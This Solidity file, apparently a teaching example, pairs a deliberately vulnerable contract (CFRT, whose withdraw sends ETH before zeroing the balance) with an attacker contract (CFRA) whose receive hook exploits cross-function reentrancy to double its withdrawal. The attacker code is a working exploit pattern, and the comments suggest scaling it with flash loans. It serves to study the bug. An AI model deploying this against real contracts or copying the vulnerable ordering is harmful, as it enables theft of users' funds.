// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;
import {console} from 'hardhat/console.sol';

/// @title CrossFuncReentrancyTarget
contract CFRT {
    mapping(address => uint256) public balances;

    /// Sends ETH and updates in-contract balance of sender.
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// Creates an in-contract transfer by updating the balance of the sender and receiver.
    /// Similar to an ERC20 transfer.
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, 'Insufficient funds');
        balances[to] += amount;
        balances[msg.sender] -= amount;
    }

    /// Withdraws all of the ETH the caller has in balance and resets balance to 0.
    /// Is vulnerable to reentrancy which could be fixed by transfering the ETH
    /// after changing the balance.
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        // At the line below, the caller's receive function is executed.
        (bool sent, ) = msg.sender.call{value: amount}('');
        require(sent, 'Failed to send Ether');
        balances[msg.sender] = 0;
    }
}

/// @title CrossFuncReentrancyAttacker
/// @notice The attacker is able to withdraw double what they have deposited.
/// @notice This attack can be leveraged by using a flash loan.
contract CFRA {
    /// An interface to the target that will allow us to call its functions.
    CFRT public target;

    /// Address of the hacker.
    address owner;

    /// Set the target on deployment because we need it in storage
    /// to be able to call it from the receive function.
    constructor(address _target) {
        target = CFRT(_target);
        owner = msg.sender;
    }

    /// Deposit ETH into the target contract. This increases the attacker's balance.
    function deposit() public payable {
        target.deposit{value: msg.value}();
    }

    /// Withdraw ETH from the target contract. This will call the receive function
    /// and allows us to take over the control flow.
    function attack() public payable {
        target.withdraw();
    }

    /// This is called when the target contract sends ETH to this contract.
    /// This is where we are taking over the control flow to transfer
    /// in-contract ETH to the attacker owner address.
    receive() external payable {
        uint256 thisBalance = target.balances(address(this));
        uint256 targetBalance = address(target).balance;

        if (targetBalance >= thisBalance) {
            target.transfer(owner, thisBalance);
        } else {
            target.transfer(owner, targetBalance);
        }
    }

    /// Withdraw all ETH from the attacker contract to owner.
    function withdraw() public {
        (bool sent, ) = owner.call{value: address(this).balance}('');
        require(sent, 'Failed to send Ether');
    }
}
